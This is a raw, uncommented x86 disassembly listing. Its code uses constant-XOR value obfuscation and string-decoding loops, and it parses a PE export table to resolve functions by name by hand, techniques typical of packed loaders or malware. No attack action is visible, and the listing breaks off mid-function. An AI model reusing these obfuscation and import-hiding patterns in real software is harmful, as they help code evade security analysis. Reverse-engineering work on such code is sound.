  427cd0:	add    ecx,esi
  427cd2:	cmp    edx,ecx
  427cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  427cd7:	jbe    0x427ceb
  427cd9:	add    ecx,DWORD PTR [ebp+0x8]
  427cdc:	mov    edx,DWORD PTR [ebp-0x4]
  427cdf:	add    edx,DWORD PTR [ebp+0xc]
  427ce2:	mov    edx,DWORD PTR [edx]
  427ce4:	mov    DWORD PTR [ecx],edx
  427ce6:	mov    ecx,DWORD PTR [ebp-0x10]
  427ce9:	jmp    0x427d10
  427ceb:	mov    edx,DWORD PTR [ebp+0x10]
  427cee:	sub    edx,ecx
  427cf0:	mov    ecx,DWORD PTR [ebp-0x14]
  427cf3:	xor    ecx,eax
  427cf5:	add    ecx,esi
  427cf7:	cmp    edx,ecx
  427cf9:	mov    ecx,DWORD PTR [ebp-0x4]
  427cfc:	jbe    0x427d21
  427cfe:	add    ecx,DWORD PTR [ebp+0x8]
  427d01:	mov    edx,DWORD PTR [ebp-0x4]
  427d04:	add    edx,DWORD PTR [ebp+0xc]
  427d07:	mov    dx,WORD PTR [edx]
  427d0a:	mov    WORD PTR [ecx],dx
  427d0d:	mov    ecx,DWORD PTR [ebp-0x14]
  427d10:	mov    edx,DWORD PTR [ebp-0x4]
  427d13:	xor    ecx,eax
  427d15:	lea    ecx,[ecx+edx*1+0x3272f1]
  427d1c:	mov    DWORD PTR [ebp-0x4],ecx
  427d1f:	jmp    0x427d31
  427d21:	add    ecx,DWORD PTR [ebp+0x8]
  427d24:	mov    edx,DWORD PTR [ebp-0x4]
  427d27:	add    edx,DWORD PTR [ebp+0xc]
  427d2a:	mov    dl,BYTE PTR [edx]
  427d2c:	mov    BYTE PTR [ecx],dl
  427d2e:	inc    DWORD PTR [ebp-0x4]
  427d31:	mov    ecx,DWORD PTR [ebp-0x18]
  427d34:	mov    edx,DWORD PTR [ebp+0x10]
  427d37:	xor    ecx,eax
  427d39:	add    ecx,esi
  427d3b:	imul   ecx,edx
  427d3e:	mov    edx,DWORD PTR [ebp-0x8]
  427d41:	mov    edi,DWORD PTR [ebp-0x4]
  427d44:	xor    edx,eax
  427d46:	lea    edx,[edx+edi*1+0x3272f1]
  427d4d:	cmp    edx,ecx
  427d4f:	jb     0x427c95
  427d55:	pop    edi
  427d56:	pop    esi
  427d57:	leave  
  427d58:	ret    0xc
  427d5b:	push   ebp
  427d5c:	mov    ebp,esp
  427d5e:	sub    esp,0xc
  427d61:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427d68:	push   esi
  427d69:	mov    esi,eax
  427d6b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427d72:	mov    edx,DWORD PTR [ebp-0x4]
  427d75:	mov    eax,0x75108aa
  427d7a:	xor    edx,eax
  427d7c:	mov    ecx,0x3272f1
  427d81:	add    edx,ecx
  427d83:	cmp    esi,edx
  427d85:	je     0x427dc7
  427d87:	push   ebx
  427d88:	push   edi
  427d89:	mov    edx,DWORD PTR [ebp-0x8]
  427d8c:	mov    ebx,DWORD PTR [ebp+0x8]
  427d8f:	xor    edx,eax
  427d91:	mov    edi,0xffcd8d0f
  427d96:	sub    edi,edx
  427d98:	add    esi,edi
  427d9a:	lea    edx,[esi-0x3272f1]
  427da0:	xor    edx,eax
  427da2:	mov    DWORD PTR [ebp-0xc],edx
  427da5:	mov    edx,DWORD PTR [ebp-0x4]
  427da8:	mov    edi,DWORD PTR [ebp-0xc]
  427dab:	xor    dl,0xaa
  427dae:	sub    dl,0xf
  427db1:	xor    edi,eax
  427db3:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427dba:	mov    edx,DWORD PTR [ebp-0x4]
  427dbd:	xor    edx,eax
  427dbf:	add    edx,ecx
  427dc1:	cmp    esi,edx
  427dc3:	jne    0x427d89
  427dc5:	pop    edi
  427dc6:	pop    ebx
  427dc7:	pop    esi
  427dc8:	leave  
  427dc9:	ret    0x4
  427dcc:	push   ebp
  427dcd:	mov    ebp,esp
  427dcf:	sub    esp,0x21c
  427dd5:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427ddc:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427de3:	mov    eax,DWORD PTR [ebp+0x10]
  427de6:	mov    eax,DWORD PTR [ebp-0x4]
  427de9:	mov    ecx,DWORD PTR [ebp+0x8]
  427dec:	push   esi
  427ded:	push   edi
  427dee:	mov    edi,0x75108aa
  427df3:	xor    eax,edi
  427df5:	mov    esi,0x3272f1
  427dfa:	add    eax,esi
  427dfc:	cmp    eax,ecx
  427dfe:	mov    eax,DWORD PTR [ebp-0x4]
  427e01:	jne    0x427e0c
  427e03:	xor    eax,edi
  427e05:	add    eax,esi
  427e07:	jmp    0x427eb8
  427e0c:	mov    ecx,DWORD PTR [ebp+0xc]
  427e0f:	xor    eax,edi
  427e11:	add    eax,esi
  427e13:	cmp    eax,ecx
  427e15:	jne    0x427e1c
  427e17:	mov    eax,DWORD PTR [ebp-0x4]
  427e1a:	jmp    0x427e03
  427e1c:	lea    eax,[ebp-0x21c]
  427e22:	mov    DWORD PTR [ebp-0x8],eax
  427e25:	mov    eax,DWORD PTR [ebp+0xc]
  427e28:	mov    DWORD PTR [ebp-0x10],eax
  427e2b:	mov    eax,DWORD PTR [ebp-0x4]
  427e2e:	xor    eax,edi
  427e30:	add    eax,esi
  427e32:	mov    DWORD PTR [ebp+0x10],eax
  427e35:	mov    eax,DWORD PTR [ebp+0xc]
  427e38:	push   ebx
  427e39:	call   0x427b63
  427e3e:	mov    ebx,eax
  427e40:	mov    eax,DWORD PTR [ebp+0x8]
  427e43:	mov    eax,DWORD PTR [eax+0x14]
  427e46:	jmp    0x427ea0
  427e48:	mov    eax,DWORD PTR [ebp+0xc]
  427e4b:	sub    eax,0x8
  427e4e:	mov    DWORD PTR [ebp-0xc],eax
  427e51:	mov    eax,DWORD PTR [ebp-0xc]
  427e54:	mov    eax,DWORD PTR [eax+0x28]
  427e57:	call   0x427a4d
  427e5c:	mov    DWORD PTR [ebp+0x10],eax
  427e5f:	push   DWORD PTR [ebp+0x10]
  427e62:	mov    edx,DWORD PTR [ebp-0x8]
  427e65:	call   0x427bf2
  427e6a:	mov    eax,DWORD PTR [ebp-0x4]
  427e6d:	xor    eax,edi
  427e6f:	add    eax,esi
  427e71:	cmp    eax,ebx
  427e73:	jne    0x427e7d
  427e75:	mov    eax,DWORD PTR [ebp-0x8]
  427e78:	call   0x427adb
  427e7d:	mov    eax,DWORD PTR [ebp-0x14]
  427e80:	xor    eax,edi
  427e82:	add    eax,esi
  427e84:	push   eax
  427e85:	push   DWORD PTR [ebp-0x10]
  427e88:	mov    eax,DWORD PTR [ebp-0x8]
  427e8b:	call   0x427807
  427e90:	mov    ecx,DWORD PTR [ebp-0x4]
  427e93:	xor    ecx,edi
  427e95:	add    ecx,esi
  427e97:	cmp    eax,ecx
  427e99:	je     0x427ebe
  427e9b:	mov    eax,DWORD PTR [ebp+0xc]
  427e9e:	mov    eax,DWORD PTR [eax]
  427ea0:	mov    DWORD PTR [ebp+0xc],eax
  427ea3:	mov    eax,DWORD PTR [ebp+0x8]
  427ea6:	mov    ecx,DWORD PTR [ebp+0xc]
  427ea9:	add    eax,0x14
  427eac:	cmp    ecx,eax
  427eae:	jne    0x427e48
  427eb0:	mov    eax,DWORD PTR [ebp-0x4]
  427eb3:	xor    eax,edi
  427eb5:	add    eax,esi
  427eb7:	pop    ebx
  427eb8:	pop    edi
  427eb9:	pop    esi
  427eba:	leave  
  427ebb:	ret    0xc
  427ebe:	mov    eax,DWORD PTR [ebp-0xc]
  427ec1:	mov    eax,DWORD PTR [eax+0x18]
  427ec4:	jmp    0x427eb7
  427ec6:	push   ebp
  427ec7:	mov    ebp,esp
  427ec9:	mov    eax,DWORD PTR [ebp+0xc]
  427ecc:	sub    esp,0x10
  427ecf:	cmp    DWORD PTR [ebp+0x8],0x0
  427ed3:	push   ebx
  427ed4:	push   esi
  427ed5:	push   edi
  427ed6:	je     0x427f8b
  427edc:	test   eax,eax
  427ede:	je     0x427f8b
  427ee4:	movzx  eax,WORD PTR [eax+0x20]
  427ee8:	mov    ecx,eax
  427eea:	mov    DWORD PTR [ebp-0x10],eax
  427eed:	xor    edx,edx
  427eef:	and    DWORD PTR [ebp-0x8],edx
  427ef2:	mov    eax,0x8a98
  427ef7:	xor    ecx,eax
  427ef9:	add    ecx,0x3b5a
  427eff:	mov    DWORD PTR [ebp-0xc],ecx
  427f02:	and    DWORD PTR [ebp-0x4],0x0
  427f06:	xor    ecx,ecx
  427f08:	push   0x7d
  427f0a:	pop    edi
  427f0b:	cmp    cx,WORD PTR [ebp-0xc]
  427f0f:	jae    0x427f75
  427f11:	lea    esi,[edx-0x3b5a]
  427f17:	xor    esi,eax
  427f19:	movzx  ecx,WORD PTR [ebp-0x4]
  427f1d:	mov    ebx,DWORD PTR [ebp+0xc]
  427f20:	lea    ecx,[ebx+ecx*4]
  427f23:	cmp    WORD PTR [ecx+0x2],si
  427f27:	jne    0x427f60
  427f29:	movzx  ecx,WORD PTR [ecx]
  427f2c:	mov    edi,0x4e3e
  427f31:	cmp    cx,di
  427f34:	jne    0x427f42
  427f36:	mov    ebx,DWORD PTR [ebp+0x8]
  427f39:	movzx  edi,dx
  427f3c:	cmp    BYTE PTR [edi+ebx*1],0x0
  427f40:	je     0x427f6f
  427f42:	mov    ebx,DWORD PTR [ebp+0x8]
  427f45:	movzx  edi,dx
  427f48:	movsx  di,BYTE PTR [edi+ebx*1]
  427f4d:	mov    ebx,0x3b5a
  427f52:	sub    di,bx
  427f55:	xor    di,ax
  427f58:	cmp    cx,di
  427f5b:	je     0x427f6f
  427f5d:	push   0xffffff83
  427f5f:	pop    edi
  427f60:	inc    DWORD PTR [ebp-0x4]
  427f63:	mov    cx,WORD PTR [ebp-0xc]
  427f67:	cmp    WORD PTR [ebp-0x4],cx
  427f6b:	jb     0x427f19
  427f6d:	jmp    0x427f75
  427f6f:	inc    DWORD PTR [ebp-0x8]
  427f72:	push   0x7c
  427f74:	pop    edi
  427f75:	mov    esi,DWORD PTR [ebp+0x8]
  427f78:	movzx  ecx,dx
  427f7b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427f7f:	je     0x427f94
  427f81:	inc    edx
  427f82:	cmp    edi,0xffffff83
  427f85:	jne    0x427f02
  427f8b:	xor    eax,eax
  427f8d:	pop    edi
  427f8e:	pop    esi
  427f8f:	pop    ebx
  427f90:	leave  
  427f91:	ret    0x8
  427f94:	mov    ecx,DWORD PTR [ebp-0x8]
  427f97:	add    ecx,0xffffc4a6
  427f9d:	xor    cx,ax
  427fa0:	xor    eax,eax
  427fa2:	cmp    cx,WORD PTR [ebp-0x10]
  427fa6:	sete   al
  427fa9:	jmp    0x427f8d
  427fab:	push   ebp
  427fac:	mov    ebp,esp
  427fae:	sub    esp,0x50
  427fb1:	push   edi
  427fb2:	mov    edi,eax
  427fb4:	mov    eax,DWORD PTR [edi+0x1a8]
  427fba:	cmp    DWORD PTR [eax],0x0
  427fbd:	jne    0x427fc6
  427fbf:	xor    eax,eax
  427fc1:	jmp    0x4280f7
  427fc6:	push   DWORD PTR [ebp+0x8]
  427fc9:	push   0x2c
  427fcb:	pop    eax
  427fcc:	call   0x427d5b
  427fd1:	mov    edx,DWORD PTR [edi+0x1ac]
  427fd7:	lea    eax,[edi+0x22]
  427fda:	mov    DWORD PTR [ebp-0x4c],eax
  427fdd:	lea    eax,[edi+0x44]
  427fe0:	mov    DWORD PTR [ebp-0x48],eax
  427fe3:	lea    eax,[edi+0x66]
  427fe6:	mov    DWORD PTR [ebp-0x44],eax
  427fe9:	lea    eax,[edi+0x88]
  427fef:	mov    DWORD PTR [ebp-0x40],eax
  427ff2:	lea    eax,[edi+0xaa]
  427ff8:	mov    DWORD PTR [ebp-0x3c],eax
  427ffb:	lea    eax,[edi+0xcc]
  428001:	mov    DWORD PTR [ebp-0x38],eax
  428004:	lea    eax,[edi+0xee]
  42800a:	mov    DWORD PTR [ebp-0x34],eax
  42800d:	lea    eax,[edi+0x110]
  428013:	mov    DWORD PTR [ebp-0x30],eax
  428016:	lea    eax,[edi+0x132]
  42801c:	mov    DWORD PTR [ebp-0x2c],eax
  42801f:	lea    eax,[edi+0x154]
  428025:	push   edi
  428026:	mov    DWORD PTR [ebp-0x50],edi
  428029:	mov    DWORD PTR [ebp-0x28],eax
  42802c:	call   0x42812b
  428031:	push   eax
  428032:	mov    eax,DWORD PTR [edi+0x1a8]
  428038:	push   DWORD PTR [eax]
  42803a:	call   0x427dcc
  42803f:	mov    DWORD PTR [ebp-0x10],eax
  428042:	test   eax,eax
  428044:	je     0x4280f7
  42804a:	mov    ecx,DWORD PTR [eax+0x3c]
  42804d:	push   ebx
  42804e:	push   esi
  42804f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428053:	add    esi,eax
  428055:	mov    edi,DWORD PTR [esi+0x24]
  428058:	mov    ecx,DWORD PTR [esi+0x1c]
  42805b:	mov    edx,DWORD PTR [esi+0x20]
  42805e:	mov    ebx,DWORD PTR [esi+0x18]
  428061:	add    edi,eax
  428063:	mov    DWORD PTR [ebp-0x20],edi
  428066:	mov    edi,DWORD PTR [esi+0x14]
  428069:	add    ecx,eax
  42806b:	add    edx,eax
  42806d:	mov    DWORD PTR [ebp-0xc],ecx
  428070:	mov    DWORD PTR [ebp-0x1c],edx
  428073:	mov    DWORD PTR [ebp-0x8],edi
  428076:	cmp    edi,ebx
  428078:	ja     0x42807d
  42807a:	mov    DWORD PTR [ebp-0x8],ebx
  42807d:	xor    ebx,ebx
  42807f:	mov    DWORD PTR [ebp-0x18],ebx
  428082:	cmp    DWORD PTR [ebp-0x8],ebx
  428085:	jbe    0x4280f5
  428087:	jmp    0x42808c
  428089:	mov    edx,DWORD PTR [ebp-0x1c]
  42808c:	mov    edi,DWORD PTR [ebp-0x20]
  42808f:	movzx  edi,WORD PTR [edi+ebx*2]
  428093:	cmp    ebx,DWORD PTR [esi+0x18]
  428096:	jae    0x4280f5
  428098:	cmp    edi,DWORD PTR [esi+0x14]
  42809b:	jae    0x4280f5
  42809d:	mov    ebx,DWORD PTR [edx+ebx*4]
  4280a0:	mov    edx,DWORD PTR [ebp+0x8]
  4280a3:	mov    edi,DWORD PTR [ecx+edi*4]
  4280a6:	mov    DWORD PTR [ebp-0x4],edx
  4280a9:	lea    edx,[ebp-0x50]
  4280ac:	add    ebx,eax
  4280ae:	add    edi,eax
  4280b0:	sub    edx,DWORD PTR [ebp+0x8]
  4280b3:	mov    DWORD PTR [ebp-0x14],0xb
  4280ba:	mov    DWORD PTR [ebp-0x24],edx
  4280bd:	mov    edx,DWORD PTR [ebp-0x4]
  4280c0:	cmp    DWORD PTR [edx],0x0
  4280c3:	jne    0x4280e0
  4280c5:	mov    eax,DWORD PTR [ebp-0x24]
  4280c8:	push   DWORD PTR [eax+edx*1]
  4280cb:	push   ebx
  4280cc:	call   0x427ec6
  4280d1:	mov    ecx,DWORD PTR [ebp-0xc]
  4280d4:	test   eax,eax
  4280d6:	je     0x4280dd
  4280d8:	mov    eax,DWORD PTR [ebp-0x4]
  4280db:	mov    DWORD PTR [eax],edi
  4280dd:	mov    eax,DWORD PTR [ebp-0x10]
  4280e0:	add    DWORD PTR [ebp-0x4],0x4
  4280e4:	dec    DWORD PTR [ebp-0x14]
  4280e7:	jne    0x4280bd
  4280e9:	mov    ebx,DWORD PTR [ebp-0x18]
  4280ec:	inc    ebx
  4280ed:	mov    DWORD PTR [ebp-0x18],ebx
  4280f0:	cmp    ebx,DWORD PTR [ebp-0x8]
  4280f3:	jb     0x428089
  4280f5:	pop    esi
  4280f6:	pop    ebx
  4280f7:	pop    edi
  4280f8:	leave  
  4280f9:	ret    0x4
  4280fc:	push   ebp
  4280fd:	mov    ebp,esp
  4280ff:	mov    eax,DWORD PTR [ebp+0x8]
  428102:	push   esi
  428103:	push   DWORD PTR [eax+0x1e0]
  428109:	lea    esi,[eax+0x198]
  42810f:	mov    eax,DWORD PTR [ebp+0x8]
  428112:	call   0x427fab
  428117:	mov    ecx,DWORD PTR [esi]
  428119:	mov    DWORD PTR [ecx],eax
  42811b:	mov    eax,DWORD PTR [esi]
  42811d:	xor    ecx,ecx
  42811f:	cmp    DWORD PTR [eax],ecx
  428121:	pop    esi
  428122:	setne  cl
  428125:	mov    eax,ecx
  428127:	pop    ebp
  428128:	ret    0x4
  42812b:	mov    ecx,DWORD PTR [edi+0x188]
  428131:	push   ebx
  428132:	jmp    0x428147
  428134:	xor    eax,0x8a98
  428139:	add    eax,0x3b5a
  42813e:	mov    WORD PTR [ecx],ax
  428141:	add    ecx,0x2
  428144:	add    edx,0x2
  428147:	movzx  eax,WORD PTR [edx]
  42814a:	mov    ebx,0x4e3e
  42814f:	cmp    ax,bx
  428152:	jne    0x428134
  428154:	xor    eax,eax
  428156:	mov    WORD PTR [ecx],ax
  428159:	mov    eax,DWORD PTR [edi+0x188]
  42815f:	pop    ebx
  428160:	ret    
  428161:	push   edi
  428162:	mov    edi,eax
  428164:	mov    eax,DWORD PTR [esi+0x188]
  42816a:	shl    edi,0x6
  42816d:	add    eax,edi
  42816f:	jmp    0x42817a
  428171:	xor    cl,0x7c
  428174:	inc    cl
  428176:	mov    BYTE PTR [eax],cl
  428178:	inc    eax
  428179:	inc    edx
  42817a:	mov    cl,BYTE PTR [edx]
  42817c:	cmp    cl,0x83
  42817f:	jne    0x428171
  428181:	mov    BYTE PTR [eax],0x0
  428184:	mov    eax,DWORD PTR [esi+0x188]
  42818a:	add    eax,edi
  42818c:	pop    edi
  42818d:	ret    
  42818e:	push   ebp
  42818f:	mov    ebp,esp
  428191:	sub    esp,0x14
  428194:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42819b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  4281a2:	mov    eax,DWORD PTR [ebx]
  4281a4:	mov    DWORD PTR [ebp-0x8],eax
  4281a7:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4281ae:	push   esi
  4281af:	push   edi
  4281b0:	mov    DWORD PTR [ebp-0x14],0xead71885
  4281b7:	mov    edi,DWORD PTR [ebp-0x4]
  4281ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4281bd:	mov    eax,0x75108aa
  4281c2:	xor    edi,eax
  4281c4:	mov    edx,0x3272f1
  4281c9:	xor    ecx,eax
  4281cb:	add    edi,edx
  4281cd:	add    ecx,edx
  4281cf:	imul   edi,ecx
  4281d2:	jmp    0x42821a
  4281d4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281d7:	mov    esi,DWORD PTR [ebp-0x4]
  4281da:	xor    ecx,eax
  4281dc:	xor    esi,eax
  4281de:	add    ecx,edx
  4281e0:	add    esi,edx
  4281e2:	test   esi,ecx
  4281e4:	mov    esi,DWORD PTR [ebp-0x8]
  4281e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4281ea:	je     0x428201
  4281ec:	xor    ecx,eax
  4281ee:	xor    esi,eax
  4281f0:	add    ecx,edx
  4281f2:	add    esi,edx
  4281f4:	shr    esi,cl
  4281f6:	mov    ecx,DWORD PTR [ebp-0x14]
  4281f9:	xor    ecx,eax
  4281fb:	add    ecx,edx
  4281fd:	xor    esi,ecx
  4281ff:	jmp    0x42820b
  428201:	xor    esi,eax
  428203:	xor    ecx,eax
  428205:	add    esi,edx
  428207:	add    ecx,edx
  428209:	shr    esi,cl
  42820b:	mov    DWORD PTR [ebp-0x8],esi
  42820e:	mov    ecx,DWORD PTR [ebp-0x4]
  428211:	xor    ecx,eax
  428213:	lea    edi,[edi+ecx*1+0x3272f1]
  42821a:	mov    ecx,DWORD PTR [ebp-0xc]
  42821d:	mov    esi,DWORD PTR [ebp-0x4]
  428220:	xor    esi,eax
  428222:	xor    ecx,eax
  428224:	sub    ecx,esi
  428226:	cmp    edi,ecx
  428228:	jbe    0x4281d4
  42822a:	mov    eax,DWORD PTR [ebp-0x8]
  42822d:	pop    edi
  42822e:	mov    DWORD PTR [ebx],eax
  428230:	mov    eax,DWORD PTR [ebp-0x8]
  428233:	pop    esi
  428234:	leave  
  428235:	ret    
  428236:	push   ebp
  428237:	mov    ebp,esp
  428239:	sub    esp,0x38
  42823c:	push   ebx
  42823d:	mov    ebx,0xf89c85a5
  428242:	mov    DWORD PTR [ebp-0x4],ebx
  428245:	lea    ecx,[ebx+0x15]
  428248:	mov    DWORD PTR [ebp-0x24],ecx
  42824b:	mov    eax,DWORD PTR [ebp-0x4]
  42824e:	mov    edx,DWORD PTR [ebp+0x8]
  428251:	push   esi
  428252:	mov    esi,0x75108aa
  428257:	xor    eax,esi
  428259:	push   edi
  42825a:	mov    edi,0x3272f1
  42825f:	add    eax,edi
  428261:	cmp    edx,eax
  428263:	mov    eax,DWORD PTR [ebp-0x4]
  428266:	je     0x4283ca
  42826c:	mov    edx,DWORD PTR [ebp+0xc]
  42826f:	xor    eax,esi
  428271:	add    eax,edi
  428273:	cmp    edx,eax
  428275:	je     0x4283c7
  42827b:	mov    eax,DWORD PTR [ebp+0x10]
  42827e:	mov    edx,DWORD PTR [ebp+0xc]
  428281:	mov    DWORD PTR [ebp-0x14],eax
  428284:	mov    eax,DWORD PTR [ebp+0x8]
  428287:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42828e:	mov    DWORD PTR [ebp-0xc],eax
  428291:	lea    eax,[ebx+0x16]
  428294:	mov    DWORD PTR [ebp-0x1c],eax
  428297:	mov    DWORD PTR [ebp-0x10],ebx
  42829a:	mov    DWORD PTR [ebp+0xc],ecx
  42829d:	mov    DWORD PTR [ebp+0x10],eax
  4282a0:	mov    eax,DWORD PTR [ebp+0xc]
  4282a3:	xor    eax,esi
  4282a5:	mov    DWORD PTR [ebp-0x20],edx
  4282a8:	sub    edx,eax
  4282aa:	sub    edx,edi
  4282ac:	mov    DWORD PTR [ebp+0x8],edx
  4282af:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  4282b6:	jmp    0x4283b7
  4282bb:	mov    eax,DWORD PTR [ebp+0xc]
  4282be:	mov    ecx,DWORD PTR [ebp+0xc]
  4282c1:	xor    eax,esi
  4282c3:	xor    ecx,esi
  4282c5:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4282cc:	mov    eax,DWORD PTR [ebp+0x8]
  4282cf:	xor    edx,edx
  4282d1:	div    ecx
  4282d3:	mov    eax,DWORD PTR [ebp+0x10]
  4282d6:	mov    ecx,DWORD PTR [ebp+0xc]
  4282d9:	xor    eax,esi
  4282db:	xor    ecx,esi
  4282dd:	sub    eax,ecx
  4282df:	cmp    edx,eax
  4282e1:	jne    0x428376
  4282e7:	mov    eax,DWORD PTR [ebp+0x8]
  4282ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4282ed:	mov    dl,BYTE PTR [eax+ecx*1]
  4282f0:	mov    eax,DWORD PTR [ebp-0x10]
  4282f3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282f6:	xor    eax,esi
  4282f8:	xor    ecx,esi
  4282fa:	add    eax,edi
  4282fc:	add    ecx,edi
  4282fe:	cmp    eax,ecx
  428300:	jae    0x428348
  428302:	lea    ecx,[eax-0x3272f1]
  428308:	mov    DWORD PTR [ebp-0x4],ecx
  42830b:	mov    ebx,DWORD PTR [ebp-0x4]
  42830e:	xor    ebx,esi
  428310:	add    ebx,0x7f55d8fb
  428316:	lea    ecx,[ebp+eax*4-0x38]
  42831a:	mov    DWORD PTR [ecx],ebx
  42831c:	mov    ebx,DWORD PTR [ecx]
  42831e:	cmp    ebx,0x244ecb98
  428324:	jbe    0x42832e
  428326:	add    DWORD PTR [ecx],0x405fcd9
  42832c:	jmp    0x428334
  42832e:	add    DWORD PTR [ecx],0xfdaf4327
  428334:	mov    ecx,DWORD PTR [ebp-0x8]
  428337:	xor    ecx,esi
  428339:	inc    eax
  42833a:	inc    DWORD PTR [ebp-0x4]
  42833d:	add    ecx,edi
  42833f:	cmp    eax,ecx
  428341:	jb     0x42830b
  428343:	mov    ebx,0xf89c85a5
  428348:	cmp    DWORD PTR [ebp-0x14],0x0
  42834c:	jne    0x428355
  42834e:	xor    dl,0x7c
  428351:	inc    dl
  428353:	jmp    0x42836b
  428355:	mov    eax,DWORD PTR [ebp-0x18]
  428358:	xor    al,0xaa
  42835a:	mov    cl,0xf
  42835c:	sub    cl,al
  42835e:	add    dl,cl
  428360:	mov    ecx,DWORD PTR [ebp-0x1c]
  428363:	xor    cl,0xaa
  428366:	sub    cl,0xf
  428369:	ror    dl,cl
  42836b:	xor    eax,eax
  42836d:	mov    eax,DWORD PTR [ebp+0x8]
  428370:	mov    ecx,DWORD PTR [ebp-0xc]
  428373:	mov    BYTE PTR [eax+ecx*1],dl
  428376:	mov    eax,DWORD PTR [ebp+0x8]
  428379:	mov    ecx,DWORD PTR [ebp-0x10]
  42837c:	sub    eax,edi
  42837e:	xor    eax,esi
  428380:	cmp    eax,ecx
  428382:	jne    0x4283a5
  428384:	mov    eax,DWORD PTR [ebp+0x10]
  428387:	mov    ecx,DWORD PTR [ebp+0xc]
  42838a:	xor    eax,esi
  42838c:	xor    ecx,esi
  42838e:	sub    eax,ecx
  428390:	mov    ecx,DWORD PTR [ebp-0x20]
  428393:	sub    eax,edi
  428395:	xor    eax,esi
  428397:	mov    DWORD PTR [ebp+0x10],eax
  42839a:	mov    eax,DWORD PTR [ebp+0xc]
  42839d:	xor    eax,esi
  42839f:	sub    ecx,eax
  4283a1:	sub    ecx,edi
  4283a3:	jmp    0x4283b4
  4283a5:	mov    eax,DWORD PTR [ebp+0xc]
  4283a8:	xor    eax,esi
  4283aa:	mov    ecx,0xffcd8d0f
  4283af:	sub    ecx,eax
  4283b1:	add    ecx,DWORD PTR [ebp+0x8]
  4283b4:	mov    DWORD PTR [ebp+0x8],ecx
  4283b7:	mov    eax,DWORD PTR [ebp+0x10]
  4283ba:	cmp    eax,ebx
  4283bc:	jne    0x4282bb
  4283c2:	mov    eax,DWORD PTR [ebp-0x24]
  4283c5:	jmp    0x4283ca
  4283c7:	mov    eax,DWORD PTR [ebp-0x4]
  4283ca:	xor    eax,esi
  4283cc:	add    eax,edi
  4283ce:	pop    edi
  4283cf:	pop    esi
  4283d0:	pop    ebx
  4283d1:	leave  
  4283d2:	ret    0xc
  4283d5:	push   ebp
  4283d6:	mov    ebp,esp
  4283d8:	sub    esp,0x420
  4283de:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4283e5:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  4283ec:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4283f3:	push   ebx
  4283f4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4283fb:	mov    eax,DWORD PTR [ebp-0x14]
  4283fe:	push   esi
  4283ff:	mov    esi,0x75108aa
  428404:	push   edi
  428405:	xor    eax,esi
  428407:	mov    edi,0x3272f1
  42840c:	add    eax,edi
  42840e:	mov    DWORD PTR [ebp-0x8],eax
  428411:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428418:	mov    DWORD PTR [ebp-0x4],0xead71885
  42841f:	mov    DWORD PTR [ebp-0x10],0x8
  428426:	mov    ecx,ecx
  428428:	mov    eax,DWORD PTR [ebp-0xc]
  42842b:	mov    ecx,DWORD PTR [ebp-0x14]
  42842e:	xor    eax,esi
  428430:	xor    ecx,esi
  428432:	add    eax,edi
  428434:	add    ecx,edi
  428436:	imul   eax,ecx
  428439:	jmp    0x42846c
  42843b:	mov    eax,DWORD PTR [ebp-0x4]
  42843e:	sub    eax,edi
  428440:	xor    eax,esi
  428442:	mov    DWORD PTR [ebp-0x8],eax
  428445:	lea    ebx,[ebp-0x8]
  428448:	call   0x42818e
  42844d:	mov    DWORD PTR [ebp-0x8],eax
  428450:	mov    eax,DWORD PTR [ebp-0x8]
  428453:	mov    ecx,DWORD PTR [ebp-0x4]
  428456:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42845d:	mov    eax,DWORD PTR [ebp-0xc]
  428460:	mov    ecx,DWORD PTR [ebp-0x4]
  428463:	xor    eax,esi
  428465:	lea    eax,[eax+ecx*1+0x3272f1]
  42846c:	mov    DWORD PTR [ebp-0x4],eax
  42846f:	mov    eax,DWORD PTR [ebp-0x18]
  428472:	mov    ecx,DWORD PTR [ebp-0xc]
  428475:	xor    ecx,esi
  428477:	xor    eax,esi
  428479:	sub    eax,ecx
  42847b:	mov    ecx,DWORD PTR [ebp-0x4]
  42847e:	cmp    ecx,eax
  428480:	jbe    0x42843b
  428482:	mov    eax,DWORD PTR [ebp-0x1c]
  428485:	xor    eax,esi
  428487:	add    eax,edi
  428489:	mov    DWORD PTR [ebp-0x8],eax
  42848c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428493:	mov    ebx,ebx
  428495:	jmp    0x4284f8
  428497:	mov    ecx,DWORD PTR [ebp-0x20]
  42849a:	mov    eax,DWORD PTR [ebp-0x8]
  42849d:	xor    ecx,esi
  42849f:	add    ecx,edi
  4284a1:	shr    eax,cl
  4284a3:	mov    DWORD PTR [ebp-0x4],eax
  4284a6:	mov    eax,DWORD PTR [ebp+0x8]
  4284a9:	mov    cl,BYTE PTR [eax]
  4284ab:	mov    BYTE PTR [ebp+0xb],cl
  4284ae:	mov    cl,BYTE PTR [ebp+0xb]
  4284b1:	mov    edx,DWORD PTR [ebp-0x8]
  4284b4:	movzx  ecx,cl
  4284b7:	xor    ecx,edx
  4284b9:	mov    DWORD PTR [ebp+0x8],ecx
  4284bc:	mov    ecx,DWORD PTR [ebp-0x18]
  4284bf:	mov    edx,DWORD PTR [ebp+0x8]
  4284c2:	xor    ecx,esi
  4284c4:	add    ecx,edi
  4284c6:	and    ecx,edx
